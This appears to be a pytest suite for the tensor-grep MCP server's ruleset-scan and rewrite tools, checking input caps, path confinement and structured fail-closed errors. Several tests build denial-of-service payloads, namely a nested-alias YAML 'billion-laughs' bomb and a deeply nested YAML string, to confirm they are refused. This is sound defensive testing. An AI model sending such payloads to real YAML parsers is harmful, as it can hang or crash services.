def test_tg_ruleset_scan_inline_rules_unsupported_language_fails_closed(tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    from tensor_grep.cli import mcp_server

    inline_rules = "\n".join([
        "id: unsupported-language",
        "language: Dart",
        "rule:",
        "  pattern: print($A)",
    ])

    payload = json.loads(mcp_server.tg_ruleset_scan(inline_rules=inline_rules, path="."))

    assert payload["error"]["code"] == "invalid_input"
    assert "Unsupported AST language Dart" in payload["error"]["message"]
    assert "Traceback" not in payload["error"]["message"]


def test_tg_ruleset_scan_inline_rules_honors_explicit_language_override(monkeypatch, tmp_path):
    """The `inferred_language = normalize_ast_language(language) if language else
    str(rules[0]["language"]) else` branch only runs when the caller passes `language=`
    explicitly (the rule's OWN embedded `language:` field, and the no-override default, take
    a different path entirely) -- exercise it directly so a regression there (e.g. a missing
    normalize_ast_language import) is actually caught."""
    from tensor_grep.cli import mcp_server
    from tests.unit.test_cli_modes import _FakeAstPipeline, _FakeAstScanner

    monkeypatch.setattr("tensor_grep.core.pipeline.Pipeline", _FakeAstPipeline)
    monkeypatch.setattr("tensor_grep.io.directory_scanner.DirectoryScanner", _FakeAstScanner)
    monkeypatch.chdir(tmp_path)

    Path("a.py").write_text("print($A)\n", encoding="utf-8")

    # No `language:` field on the rule itself -- the explicit `language=` override must supply
    # it via the `if language:` branch, not the rule's own per-document field.
    inline_rules = "id: no-print\nrule:\n  pattern: print($A)\n"

    payload = json.loads(
        mcp_server.tg_ruleset_scan(inline_rules=inline_rules, path=".", language="python")
    )

    assert payload["language"] == "python"
    assert payload["findings"][0]["rule_id"] == "no-print"


def test_tg_ruleset_scan_inline_rules_rejects_oversized_input(tmp_path, monkeypatch):
    """[SEC] YAML expansion-bomb DoS -- DEFENSE-IN-DEPTH layer 1 (the length cap). Bounding the
    raw string length before it reaches the YAML loader is a cheap, unconditional guard --
    verify the tool actually enforces the cap (not merely documents it) and that the rejection
    happens BEFORE any YAML parsing (a bomb payload well past the cap must still be refused
    fast, not hang trying to parse it). NOTE: the length cap ALONE does NOT stop the bomb -- an
    aliased payload detonates by depth ~9 while the cap admits depth ~1000, so the real fix is
    the loader-level alias rejection; see test_tg_ruleset_scan_inline_rules_rejects_yaml_alias_bomb
    (audit #95 Part-2 Opus-gate BLOCK)."""
    from tensor_grep.cli import mcp_server

    monkeypatch.chdir(tmp_path)
    oversized = "a" * (mcp_server._MAX_INLINE_RULES_CHARS + 1)

    payload = json.loads(mcp_server.tg_ruleset_scan(inline_rules=oversized, path="."))

    assert payload["error"]["code"] == "invalid_input"
    assert "exceeds" in payload["error"]["message"].lower()
    assert str(mcp_server._MAX_INLINE_RULES_CHARS) in payload["error"]["message"]


def test_tg_ruleset_scan_inline_rules_rejects_yaml_alias_bomb(tmp_path, monkeypatch):
    """[SEC] YAML alias-expansion DoS (billion-laughs) -- audit #95 Part-2 Opus-gate BLOCK.

    SafeLoader SHARES alias nodes, so the load itself is linear -- but the downstream ``str()``
    coercions on ``id``/``severity``/``message`` in ``_load_inline_rule_specs`` deep-walk that
    shared graph and expand it ~9^depth. A sub-64 KiB nested-alias payload therefore detonates by
    depth ~9 (the gate proved a 469-byte payload hung >15s), completely under the length cap
    (which admits depth ~1000). The fix rejects YAML aliases at the loader level
    (``_NoAliasSafeLoader.compose_node`` raises on the first ``AliasEvent``, before any expansion),
    so the bomb is refused as ``invalid_input`` fast.

    Kept SHALLOW (depth 5) on purpose: the fix rejects at the FIRST alias regardless of depth, so
    shallow still proves it, and if the loader-level rejection ever regresses this test FAILS FAST
    on the assertion (the scan returns a non-``invalid_input`` result) instead of OOM/hanging the
    suite. A watchdog thread is the belt-and-suspenders anti-hang guard (anti-hang-test-protocol).
    """
    import threading

    from tensor_grep.cli import mcp_server

    monkeypatch.chdir(tmp_path)

    # Nested YAML aliases -- the billion-laughs vector. a0 is the anchored seed; each level
    # aliases the previous 9x. WELL under _MAX_INLINE_RULES_CHARS, so ONLY the _NoAliasSafeLoader
    # alias rejection -- not the length bound -- can stop it. The `severity: *a4` reaches the
    # str()-coercion detonation point.
    lines = ['a0: &a0 ["lol", "lol", "lol", "lol", "lol", "lol", "lol", "lol", "lol"]']
    for depth in range(1, 5):
        refs = ", ".join([f"*a{depth - 1}"] * 9)
        lines.append(f"a{depth}: &a{depth} [{refs}]")
    lines += ["rules:", '  - pattern: "print($X)"', "    severity: *a4"]
    bomb = "\n".join(lines)
    assert len(bomb) < mcp_server._MAX_INLINE_RULES_CHARS, (
        "payload must be sub-cap to test the loader, not the length bound"
    )

    result: dict[str, str] = {}

    def _run() -> None:
        result["payload"] = mcp_server.tg_ruleset_scan(inline_rules=bomb, path=".")

    worker = threading.Thread(target=_run, daemon=True)
    worker.start()
    worker.join(timeout=15.0)
    assert not worker.is_alive(), (
        "tg_ruleset_scan HUNG on a sub-64 KiB YAML alias bomb -- the _NoAliasSafeLoader alias "
        "rejection regressed; the _MAX_INLINE_RULES_CHARS length cap alone does NOT stop this DoS."
    )

    payload = json.loads(result["payload"])
    assert payload.get("error", {}).get("code") == "invalid_input", (
        f"alias bomb must be refused as invalid_input (loader-level alias rejection); got: {payload}"
    )
    assert "YAML" in payload["error"]["message"]
    assert "Traceback" not in payload["error"]["message"]


def test_tg_ruleset_scan_inline_rules_rejects_deep_nested_yaml(tmp_path, monkeypatch):
    """[SEC] Deep-nested ALIAS-FREE YAML DoS residual -- audit #95 Part-2 re-gate BLOCK.

    A ~40 KB payload of 20000 nested flow-sequences (`"["*20000 + "]"*20000`) is UNDER the 64 KiB
    length cap and has NO aliases, so `_NoAliasSafeLoader` cannot reject it -- but it recurses the
    YAML parser/composer past the interpreter's recursion limit. The pure-Python SafeLoader raises
    a CATCHABLE `RecursionError` (the old CSafeLoader hard-crashed the whole process, exit
    0xC00000FD); the fix catches `RecursionError` at the load site so this path also fails closed
    as a structured `invalid_input` instead of escaping as a raw traceback (the tool's fail-closed
    contract). Fast (<1s, O(input) memory, process survives). On revert the assertion fails (or the
    call raises) fast -- never hangs (anti-hang-test-protocol)."""
    from tensor_grep.cli import mcp_server

    monkeypatch.chdir(tmp_path)

    deep = "rules:\n  - pattern: " + ("[" * 20000) + ("]" * 20000) + '\n    severity: "s"\n'
    assert len(deep) < mcp_server._MAX_INLINE_RULES_CHARS, (
        "payload must be sub-cap to test the loader, not the length bound"
    )

    payload = json.loads(mcp_server.tg_ruleset_scan(inline_rules=deep, path="."))

    assert payload.get("error", {}).get("code") == "invalid_input", (
        f"deep-nested YAML must fail closed as invalid_input, not a raw traceback; got: {payload}"
    )
    assert "YAML" in payload["error"]["message"]
    assert "Traceback" not in payload["error"]["message"]


def test_tg_ruleset_scan_inline_rules_rejects_excessive_rule_count(tmp_path, monkeypatch):
    """[SEC] Unbounded scan fan-out DoS -- audit #95 Part-2 re-gate. Each inline rule is a SEPARATE
    ast-grep pass (~40 ms/rule), so a payload UNDER the 64 KiB length cap can still drive a
    multi-minute scan (~1000 rules -> a >40s hang). The rule COUNT cap (_MAX_INLINE_RULES) is the
    binding bound; a payload exceeding it must be refused fast as invalid_input, BEFORE any scan
    (no ast-grep is invoked -- the count check precedes _run_ast_scan_payload)."""
    from tensor_grep.cli import mcp_server

    monkeypatch.chdir(tmp_path)

    # _MAX_INLINE_RULES + 1 valid rules, well under the 64 KiB length cap.
    n = mcp_server._MAX_INLINE_RULES + 1
    rules_yaml = "rules:\n" + "".join(
        f"  - id: r{i}\n    pattern: print($A{i})\n" for i in range(n)
    )
    assert len(rules_yaml) < mcp_server._MAX_INLINE_RULES_CHARS

    payload = json.loads(
        mcp_server.tg_ruleset_scan(inline_rules=rules_yaml, path=".", language="python")
    )

    assert payload["error"]["code"] == "invalid_input"
    assert str(n) in payload["error"]["message"]
    assert str(mcp_server._MAX_INLINE_RULES) in payload["error"]["message"]


def test_tg_ruleset_scan_backend_execution_error_fails_closed(tmp_path, monkeypatch):
    """[SEC] Backend Fail-Closed Contract -- audit #95 Part-2 re-gate. A runtime backend fault
    (BackendExecutionError, a RuntimeError -- e.g. ast-grep failing on an over-long pattern,
    WinError 206) was escaping tg_ruleset_scan's `except (BroadScanRefusedError, ValueError)` as a
    RAW TRACEBACK on a valid payload. It must surface as a structured backend_error instead."""
    from tensor_grep.backends.base import BackendExecutionError
    from tensor_grep.cli import mcp_server

    monkeypatch.chdir(tmp_path)

    def _boom(*args, **kwargs):
        raise BackendExecutionError("ast-grep failed: [WinError 206] the filename is too long")

    monkeypatch.setattr(mcp_server, "_run_ast_scan_payload", _boom)

    inline_rules = "rules:\n  - id: x\n    pattern: print($A)\n"
    payload = json.loads(
        mcp_server.tg_ruleset_scan(inline_rules=inline_rules, path=".", language="python")
    )

    assert payload["error"]["code"] == "backend_error"
    assert "backend failed" in payload["error"]["message"].lower()
    assert "Traceback" not in payload["error"]["message"]


def test_tg_ruleset_scan_configuration_error_fails_closed(tmp_path, monkeypatch):
    """[SEC] round-4 gate: ast-grep is NOT a declared dependency, so on a DEFAULT
    `pip install tensor-grep` a trivial one-line inline rule reaches
    _select_ast_backend_for_pattern, which raises ConfigurationError (a RuntimeError, NOT a
    ValueError/BackendExecutionError). That escaped tg_ruleset_scan as a RAW TRACEBACK on the
    common default-install path. Must fail closed as a structured 'unavailable'."""
    from tensor_grep.cli import mcp_server
    from tensor_grep.core.pipeline import ConfigurationError

    monkeypatch.chdir(tmp_path)

    def _boom(*a, **k):
        raise ConfigurationError("ast-grep binary not found on PATH; install ast-grep")

    monkeypatch.setattr(mcp_server, "_run_ast_scan_payload", _boom)

    payload = json.loads(
        mcp_server.tg_ruleset_scan(
            inline_rules="rules:\n  - id: x\n    pattern: print($A)\n", path=".", language="python"
        )
    )

    assert payload["error"]["code"] == "unavailable"
    assert "Traceback" not in payload["error"]["message"]


def test_tg_ruleset_scan_baseline_io_error_fails_closed(tmp_path, monkeypatch):
    """[SEC] round-4 gate: an unreadable caller-supplied baseline/suppressions path (e.g. a
    directory) makes _load_ruleset_baseline's read_text raise OSError/IsADirectoryError (NOT a
    ValueError). That escaped as a RAW TRACEBACK. Must fail closed structured, never a traceback."""
    from tensor_grep.cli import mcp_server

    monkeypatch.chdir(tmp_path)

    def _boom(*a, **k):
        raise IsADirectoryError("[Errno 21] Is a directory: 'baseline'")

    monkeypatch.setattr(mcp_server, "_run_ast_scan_payload", _boom)

    payload = json.loads(
        mcp_server.tg_ruleset_scan(
            inline_rules="rules:\n  - id: x\n    pattern: print($A)\n", path=".", language="python"
        )
    )

    assert payload["error"]["code"] == "invalid_input"
    assert "Traceback" not in payload["error"]["message"]


def test_tg_ruleset_scan_inline_rules_bad_language_override_fails_closed(tmp_path, monkeypatch):
    """[SEC] round-5 gate: a rule carrying its OWN valid `language:` short-circuits the loader's
    guarded default_language normalization, so an unsupported top-level `language=` override reaches
    normalize_ast_language (mcp_server.py:2008) UNGUARDED -- it was a raw ValueError traceback on a
    valid-but-bogus payload. Must fail closed as structured invalid_input. (The control -- a rule
    that OMITS its own language -- was already caught by the loader; this is the short-circuit gap.)
    """
    from tensor_grep.cli import mcp_server

    monkeypatch.chdir(tmp_path)

    # rule sets language=python (so the loader succeeds) + a bogus top-level override reaches 2008.
    payload = json.loads(
        mcp_server.tg_ruleset_scan(
            inline_rules="rules:\n  - id: x\n    language: python\n    pattern: print($A)\n",
            path=".",
            language="zzznotalang",
        )
    )

    assert payload["error"]["code"] == "invalid_input"
    assert "Unsupported AST language" in payload["error"]["message"]
    assert "Traceback" not in payload["error"]["message"]


def test_tg_ruleset_scan_inline_rules_at_length_boundary_still_parses(monkeypatch, tmp_path):
    """Boundary correctness for the length bound: a payload AT the cap must still reach the
    parser (not be off-by-one refused) and behave exactly like any other invalid-but-in-budget
    input -- i.e. still get the ordinary 'no valid inline rules' error, not the length error."""
    from tensor_grep.cli import mcp_server

    monkeypatch.chdir(tmp_path)
    at_cap = "#" + "a" * (mcp_server._MAX_INLINE_RULES_CHARS - 1)
    assert len(at_cap) == mcp_server._MAX_INLINE_RULES_CHARS

    payload = json.loads(mcp_server.tg_ruleset_scan(inline_rules=at_cap, path="."))

    assert payload["error"]["code"] == "invalid_input"
    assert "exceeds" not in payload["error"]["message"].lower()


def test_tg_ruleset_scan_inline_rules_confines_path(tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    from tensor_grep.cli import mcp_server

    outside = tmp_path.parent / f"outside-{tmp_path.name}"
    outside.mkdir(exist_ok=True)
    try:
        payload = json.loads(
            mcp_server.tg_ruleset_scan(
                inline_rules="id: x\nrule:\n  pattern: y\n", path=str(outside)
            )
        )
        assert payload["error"]["code"] == "invalid_input"
        assert "must stay within" in payload["error"]["message"]
    finally:
        outside.rmdir()


def test_tg_ruleset_scan_refuses_direct_temp_root_before_walking(monkeypatch, tmp_path):
    monkeypatch.chdir(tmp_path)
    from tensor_grep.cli import mcp_server
    from tests.unit.test_cli_modes import _ExplodingAstScanner

    temp_root = tmp_path / "Temp"
    temp_root.mkdir()
    (temp_root / "a.py").write_text("API_KEY = 'secret'\n", encoding="utf-8")
    monkeypatch.setattr("tensor_grep.io.directory_scanner.DirectoryScanner", _ExplodingAstScanner)

    payload = json.loads(
        mcp_server.tg_ruleset_scan("secrets-basic", path=str(temp_root), language="python")
    )

    assert payload["routing_reason"] == "builtin-ruleset-scan"
    assert payload["error"]["code"] == "broad_scan_refused"
    assert "broad AST scan refused" in payload["error"]["message"]
    assert "--allow-broad-generated-scan" in payload["error"]["message"]


def test_tg_ruleset_scan_can_emit_evidence_snippets(monkeypatch, tmp_path):
    from tensor_grep.cli import mcp_server
    from tests.unit.test_cli_modes import _FakeAstPipeline, _FakeAstScanner

    monkeypatch.setattr("tensor_grep.core.pipeline.Pipeline", _FakeAstPipeline)
    monkeypatch.setattr("tensor_grep.io.directory_scanner.DirectoryScanner", _FakeAstScanner)
    monkeypatch.chdir(tmp_path)

    Path("a.py").write_text("hashlib.md5($$$ARGS)\n", encoding="utf-8")
    Path("b.py").write_text("ok\n", encoding="utf-8")

    payload = json.loads(
        mcp_server.tg_ruleset_scan(
            "crypto-safe",
            path=".",
            language="python",
            include_evidence_snippets=True,
            max_evidence_snippets_per_file=1,
            max_evidence_snippet_chars=12,
        )
    )

    assert payload["findings"][0]["evidence"][0]["snippets"] == [
        {"text": "hashlib.md5(", "truncated": True}
    ]


def test_tg_ruleset_scan_can_compare_and_write_baseline(monkeypatch, tmp_path):
    from tensor_grep.cli import mcp_server
    from tests.unit.test_cli_modes import _FakeAstPipeline, _FakeAstScanner

    monkeypatch.setattr("tensor_grep.core.pipeline.Pipeline", _FakeAstPipeline)
    monkeypatch.setattr("tensor_grep.io.directory_scanner.DirectoryScanner", _FakeAstScanner)
    monkeypatch.chdir(tmp_path)

    Path("a.py").write_text("hashlib.md5($$$ARGS)\n", encoding="utf-8")
    Path("baseline.json").write_text(
        json.dumps(
            {
                "version": 1,
                "kind": "ruleset-scan-baseline",
                "ruleset": "crypto-safe",
                "language": "python",
                "fingerprints": [
                    hashlib.sha256(
                        json.dumps(
                            {
                                "rule_id": "python-hashlib-md5",
                                "language": "python",
                                "files": ["a.py"],
                            },
                            sort_keys=True,
                        ).encode("utf-8")
                    ).hexdigest()
                ],
            },
            indent=2,
        ),
        encoding="utf-8",
    )

    payload = json.loads(
        mcp_server.tg_ruleset_scan(
            "crypto-safe",
            path=".",
            language="python",
            baseline_path="baseline.json",
            write_baseline="written-baseline.json",
        )
    )
    written = json.loads(Path("written-baseline.json").read_text(encoding="utf-8"))

    assert payload["findings"][0]["status"] == "existing"
    assert payload["baseline"]["existing_findings"] == 1
    assert payload["baseline_written"]["count"] == 1
    assert written["fingerprints"] == [payload["findings"][0]["fingerprint"]]


def test_tg_ruleset_scan_can_apply_suppressions(monkeypatch, tmp_path):
    from tensor_grep.cli import mcp_server
    from tests.unit.test_cli_modes import _FakeAstPipeline, _FakeAstScanner

    monkeypatch.setattr("tensor_grep.core.pipeline.Pipeline", _FakeAstPipeline)
    monkeypatch.setattr("tensor_grep.io.directory_scanner.DirectoryScanner", _FakeAstScanner)
    monkeypatch.chdir(tmp_path)

    Path("a.py").write_text("hashlib.md5($$$ARGS)\n", encoding="utf-8")
    fingerprint = hashlib.sha256(
        json.dumps(
            {
                "rule_id": "python-hashlib-md5",
                "language": "python",
                "files": ["a.py"],
            },
            sort_keys=True,
        ).encode("utf-8")
    ).hexdigest()
    Path("suppressions.json").write_text(
        json.dumps(
            {"version": 1, "kind": "ruleset-scan-suppressions", "fingerprints": [fingerprint]},
            indent=2,
        ),
        encoding="utf-8",
    )

    payload = json.loads(
        mcp_server.tg_ruleset_scan(
            "crypto-safe",
            path=".",
            language="python",
            suppressions_path="suppressions.json",
        )
    )

    assert payload["findings"][0]["status"] == "suppressed"
    assert payload["suppressions"]["suppressed_findings"] == 1


def test_tg_ruleset_scan_can_write_suppressions(monkeypatch, tmp_path):
    from tensor_grep.cli import mcp_server
    from tests.unit.test_cli_modes import _FakeAstPipeline, _FakeAstScanner

    monkeypatch.setattr("tensor_grep.core.pipeline.Pipeline", _FakeAstPipeline)
    monkeypatch.setattr("tensor_grep.io.directory_scanner.DirectoryScanner", _FakeAstScanner)
    monkeypatch.chdir(tmp_path)

    Path("a.py").write_text("hashlib.md5($$$ARGS)\n", encoding="utf-8")

    payload = json.loads(
        mcp_server.tg_ruleset_scan(
            "crypto-safe",
            path=".",
            language="python",
            write_suppressions="written-suppressions.json",
            justification="Approved suppression for fixture coverage.",
        )
    )
    written = json.loads(Path("written-suppressions.json").read_text(encoding="utf-8"))

    assert payload["suppressions_written"]["count"] == 1
    assert written["entries"][0]["fingerprint"] == payload["findings"][0]["fingerprint"]
    assert written["entries"][0]["justification"] == "Approved suppression for fixture coverage."
    assert written["entries"][0]["created_at"].endswith("Z")


def test_tg_ruleset_scan_write_suppressions_requires_justification(monkeypatch, tmp_path):
    from tensor_grep.cli import mcp_server
    from tests.unit.test_cli_modes import _FakeAstPipeline, _FakeAstScanner

    monkeypatch.setattr("tensor_grep.core.pipeline.Pipeline", _FakeAstPipeline)
    monkeypatch.setattr("tensor_grep.io.directory_scanner.DirectoryScanner", _FakeAstScanner)
    monkeypatch.chdir(tmp_path)

    Path("a.py").write_text("hashlib.md5($$$ARGS)\n", encoding="utf-8")

    payload = json.loads(
        mcp_server.tg_ruleset_scan(
            "crypto-safe",
            path=".",
            language="python",
            write_suppressions="written-suppressions.json",
        )
    )

    assert payload["error"]["code"] == "invalid_input"
    assert "justification" in payload["error"]["message"]


def test_tg_rewrite_plan_returns_native_plan_json_shape():
    from tensor_grep.cli import mcp_server

    payload = {
        "version": 1,
        "schema_version": 1,
        "routing_backend": "AstBackend",
        "routing_reason": "ast-native",
        "sidecar_used": False,
        "pattern": "def $F($$$ARGS): return $EXPR",
        "replacement": "lambda $$$ARGS: $EXPR",
        "lang": "python",
        "total_files_scanned": 1,
        "total_edits": 1,
        "edits": [
            {
                "id": "e0000:file.py:0-27",
                "file": "C:/tmp/file.py",
                "planned_mtime_ns": 1,
                "line": 1,
                "byte_range": {"start": 0, "end": 27},
                "original_text": "def add(x, y): return x + y",
                "replacement_text": "lambda x, y: x + y",
                "metavar_env": {"F": "add", "ARGS": "x, y", "EXPR": "x + y"},
            }
        ],
    }

    with (
        patch("tensor_grep.cli.mcp_server.resolve_native_tg_binary", return_value=Path("tg.exe")),
        patch(
            "tensor_grep.cli.mcp_server.subprocess.run",
            return_value=CompletedProcess(
                args=["tg.exe"],
                returncode=0,
                stdout=json.dumps(payload),
                stderr="",
            ),
        ) as mock_run,
    ):
        out = mcp_server.tg_rewrite_plan(
            pattern="def $F($$$ARGS): return $EXPR",
            replacement="lambda $$$ARGS: $EXPR",
            lang="python",
            path="src",
        )

    parsed = json.loads(out)
    # audit A1/A4: tg_rewrite_plan now also stamps plan_digest, match_count, and
    # mcp_contract_version onto the plan output. The original native plan fields
    # must still be present and unchanged.
    assert {key: parsed[key] for key in payload} == payload
    assert isinstance(parsed["plan_digest"], str) and parsed["plan_digest"]
    assert parsed["match_count"] == payload["total_edits"]
    assert parsed["mcp_contract_version"] == mcp_server._TG_MCP_SERVER_CONTRACT_VERSION
    # round-8 (audit #95): path="src" is now confined+resolved to an absolute cwd-relative
    # path before it reaches the native argv.
    assert mock_run.call_args.args[0] == [
        "tg.exe",
        "run",
        "--lang",
        "python",
        "--rewrite",
        "lambda $$$ARGS: $EXPR",
        "--json",
        # round-3 security: `--` ends options so a pattern beginning with `-` is a positional.
        "--",
        "def $F($$$ARGS): return $EXPR",
        str((Path.cwd() / "src").resolve()),
    ]


def test_tg_mcp_capabilities_is_registered_and_reports_no_native_runtime(monkeypatch):
    from tensor_grep.cli import mcp_server

    monkeypatch.setattr(mcp_server, "resolve_native_tg_binary", lambda: None)
    monkeypatch.setattr(mcp_server, "_embedded_rewrite_available", lambda: True, raising=False)

    assert "tg_mcp_capabilities" in _mcp_tool_names()

    payload = json.loads(_call_mcp_tool_text("tg_mcp_capabilities", {}))

    assert payload["version"] == 1
    assert payload["routing_backend"] == "MCPRuntime"
    assert payload["routing_reason"] == "mcp-capabilities"
    assert payload["sidecar_used"] is False
    assert payload["mcp_protocol_version"] == mcp_server.types.LATEST_PROTOCOL_VERSION
    assert mcp_server.types.LATEST_PROTOCOL_VERSION in payload["mcp_supported_protocol_versions"]
    assert payload["cli_version"] == mcp_server._mcp_server_version()
    assert payload["native_tg"] == {"available": False, "path": None}
    assert payload["embedded_rewrite"] == {"available": True}

    tools = {tool["name"]: tool for tool in payload["tools"]}
    assert tools["tg_mcp_capabilities"]["mode"] == "python-local"
    assert "gpu_device_ids" in tools["tg_agent_capsule"]["notes"]
    assert "unsupported" in tools["tg_agent_capsule"]["notes"]
    assert tools["tg_rewrite_plan"]["mode"] == "embedded-safe"
    assert tools["tg_rewrite_apply"]["mode"] == "embedded-safe"
    assert tools["tg_rewrite_apply"]["native_required_options"] == [
        "verify",
        "audit_manifest",
        "audit_signing_key",
        "lint_cmd",
        "test_cmd",
    ]
    assert tools["tg_rewrite_diff"]["mode"] == "native-required"
    assert tools["tg_index_search"]["mode"] == "native-required"


def test_mcp_server_initialization_version_tracks_mcp_contract() -> None:
    from tensor_grep.cli import mcp_server

    mcp_server._apply_mcp_server_metadata(mcp_server.mcp)
    options = mcp_server.mcp._mcp_server.create_initialization_options()

    assert options.server_name == "tensor-grep"
    assert options.server_version == "1.4.0"
    assert options.server_version == mcp_server._TG_MCP_SERVER_CONTRACT_VERSION
    assert mcp_server._mcp_server_version() == version("tensor-grep")


def test_tg_mcp_capabilities_registry_covers_public_tools(monkeypatch):
    from tensor_grep.cli import mcp_server

    monkeypatch.setattr(mcp_server, "resolve_native_tg_binary", lambda: Path("tg.exe"))
    monkeypatch.setattr(mcp_server, "_embedded_rewrite_available", lambda: False, raising=False)

    payload = json.loads(mcp_server.tg_mcp_capabilities())
    capability_names = {tool["name"] for tool in payload["tools"]}

    assert capability_names == set(mcp_server._MCP_TOOL_CAPABILITIES)
    assert capability_names == _mcp_tool_names()
    assert payload["native_tg"] == {"available": True, "path": "tg.exe"}
    assert payload["embedded_rewrite"] == {"available": False}


def test_tg_mcp_capabilities_reports_bad_native_override(monkeypatch, tmp_path):
    from tensor_grep.cli import mcp_server

    missing_binary = tmp_path / "missing-tg.exe"
    monkeypatch.setenv("TG_NATIVE_TG_BINARY", str(missing_binary))
    mcp_server.resolve_native_tg_binary.cache_clear()
    try:
        payload = json.loads(mcp_server.tg_mcp_capabilities())
    finally:
        mcp_server.resolve_native_tg_binary.cache_clear()

    assert payload["native_tg"]["available"] is False
    assert payload["native_tg"]["path"] is None
    assert "Configured binary" in payload["native_tg"]["error"]


def test_tg_rewrite_plan_uses_embedded_fallback_without_native_binary(monkeypatch, tmp_path):
    monkeypatch.chdir(tmp_path)
    from tensor_grep.cli import mcp_server

    expected = {
        "version": 1,
        "routing_backend": "AstBackend",
        "routing_reason": "ast-native",
        "sidecar_used": False,
        "total_edits": 0,
        "edits": [],
    }

    def fake_embedded_rewrite_json(**kwargs):
        assert kwargs["mode"] == "plan"
        return json.dumps(expected)

    monkeypatch.setattr(mcp_server, "resolve_native_tg_binary", lambda: None)
    monkeypatch.setattr(mcp_server, "_execute_embedded_rewrite_json", fake_embedded_rewrite_json)

    out = mcp_server.tg_rewrite_plan(
        pattern="def $F(): pass",
        replacement="def $F(): ...",
        lang="python",
        path=str(tmp_path),
    )

    parsed = json.loads(out)
    # audit A1: the plan is stamped with a stable plan_digest and match_count.
    assert {key: parsed[key] for key in expected} == expected
    assert isinstance(parsed["plan_digest"], str) and parsed["plan_digest"]
    assert parsed["match_count"] == 0


def test_tg_rewrite_plan_reports_unavailable_without_native_or_embedded(monkeypatch, tmp_path):
    monkeypatch.chdir(tmp_path)
    from tensor_grep.cli import mcp_server

    monkeypatch.setattr(mcp_server, "resolve_native_tg_binary", lambda: None)
    monkeypatch.setattr(mcp_server, "_embedded_rewrite_available", lambda: False)

    payload = json.loads(
        mcp_server.tg_rewrite_plan(
            pattern="def $F(): pass",
            replacement="def $F(): ...",
            lang="python",
            path=str(tmp_path),
        )
    )

    assert payload["routing_backend"] == "AstBackend"
    assert payload["routing_reason"] == "native-tg-unavailable"
    assert payload["tool"] == "tg_rewrite_plan"
    assert payload["error"]["code"] == "unavailable"
    assert "TG_NATIVE_TG_BINARY" in payload["error"]["remediation"]


def test_tg_rewrite_apply_verify_returns_unavailable_without_native_binary(monkeypatch, tmp_path):
    monkeypatch.chdir(tmp_path)
    from tensor_grep.cli import mcp_server

    monkeypatch.setattr(mcp_server, "resolve_native_tg_binary", lambda: None)
    monkeypatch.setattr(mcp_server, "_embedded_rewrite_available", lambda: True)

    payload = json.loads(
        mcp_server.tg_rewrite_apply(
            pattern="def $F(): pass",
            replacement="def $F(): ...",
            lang="python",
            path=str(tmp_path),
            verify=True,
        )
    )

    assert payload["routing_backend"] == "AstBackend"
    assert payload["routing_reason"] == "native-tg-unavailable"
    assert payload["tool"] == "tg_rewrite_apply"
    assert payload["error"]["code"] == "unavailable"
    assert "verify" in payload["error"]["message"]
    assert "TG_NATIVE_TG_BINARY" in payload["error"]["remediation"]


def test_tg_rewrite_diff_returns_unavailable_without_native_binary(monkeypatch, tmp_path):
    monkeypatch.chdir(tmp_path)
    from tensor_grep.cli import mcp_server

    monkeypatch.setattr(mcp_server, "resolve_native_tg_binary", lambda: None)

    payload = json.loads(
        mcp_server.tg_rewrite_diff(
            pattern="def $F(): pass",
            replacement="def $F(): ...",
            lang="python",
            path=str(tmp_path),
        )
    )

    assert payload["routing_backend"] == "AstBackend"
    assert payload["routing_reason"] == "native-tg-unavailable"
    assert payload["tool"] == "tg_rewrite_diff"
    assert payload["error"]["code"] == "unavailable"
    assert "standalone native tg binary" in payload["error"]["message"]
    assert "TG_NATIVE_TG_BINARY" in payload["error"]["remediation"]


def test_tg_rewrite_diff_returns_unavailable_for_bad_native_override(monkeypatch, tmp_path):
    monkeypatch.chdir(tmp_path)
    from tensor_grep.cli import mcp_server

    monkeypatch.setenv("TG_NATIVE_TG_BINARY", str(tmp_path / "missing-tg.exe"))
    mcp_server.resolve_native_tg_binary.cache_clear()
    try:
        payload = json.loads(
            mcp_server.tg_rewrite_diff(
                pattern="def $F(): pass",
                replacement="def $F(): ...",
                lang="python",
                path=str(tmp_path),
            )
        )
    finally:
        mcp_server.resolve_native_tg_binary.cache_clear()

    assert payload["routing_reason"] == "native-tg-unavailable"
    assert payload["tool"] == "tg_rewrite_diff"
    assert payload["error"]["code"] == "unavailable"


def test_tg_index_search_returns_unavailable_without_native_binary(monkeypatch, tmp_path):
    monkeypatch.chdir(tmp_path)
    from tensor_grep.cli import mcp_server

    monkeypatch.setattr(mcp_server, "resolve_native_tg_binary", lambda: None)

    payload = json.loads(mcp_server.tg_index_search(pattern="ERROR", path=str(tmp_path)))

    assert payload["routing_backend"] == "TrigramIndex"
    assert payload["routing_reason"] == "native-tg-unavailable"
    assert payload["tool"] == "tg_index_search"
    assert payload["query"] == "ERROR"
    assert payload["path"] == str(tmp_path)
    assert payload["error"]["code"] == "unavailable"
    assert "standalone native tg binary" in payload["error"]["message"]
    assert "TG_NATIVE_TG_BINARY" in payload["error"]["remediation"]


def test_execute_rewrite_apply_json_should_use_embedded_rust_when_native_binary_missing(
    monkeypatch, tmp_path: Path
):
    from tensor_grep.cli import mcp_server

    source = tmp_path / "sample.py"
    source.write_text("def add(x, y): return x + y\n", encoding="utf-8")

    monkeypatch.setattr(mcp_server, "resolve_native_tg_binary", lambda: None)

    payload_json, exit_code = mcp_server.execute_rewrite_apply_json(
        pattern="def $F($$$ARGS): return $EXPR",
        replacement="lambda $$$ARGS: $EXPR",
        lang="python",
        path=str(source),
    )

    payload = json.loads(payload_json)
    assert exit_code == 0
    assert payload["plan"]["total_edits"] == 1
    assert payload["plan"]["edits"][0]["replacement_text"] == "lambda x, y: x + y"
    assert source.read_text(encoding="utf-8") == "lambda x, y: x + y\n"


def test_execute_rewrite_apply_json_embedded_checkpoint_when_native_binary_missing(
    monkeypatch, tmp_path: Path
):
    from tensor_grep.cli import mcp_server

    source = tmp_path / "sample.py"
    source.write_text("def add(x, y): return x + y\n", encoding="utf-8")

    monkeypatch.setattr(mcp_server, "resolve_native_tg_binary", lambda: None)

    payload_json, exit_code = mcp_server.execute_rewrite_apply_json(
        pattern="def $F($$$ARGS): return $EXPR",
        replacement="lambda $$$ARGS: $EXPR",
        lang="python",
        path=str(source),
        checkpoint=True,
    )

    payload = json.loads(payload_json)
    assert exit_code == 0
    assert payload["plan"]["total_edits"] == 1
    assert payload["checkpoint"]["checkpoint_id"].startswith("ckpt-")
    assert payload["checkpoint"]["file_count"] >= 1
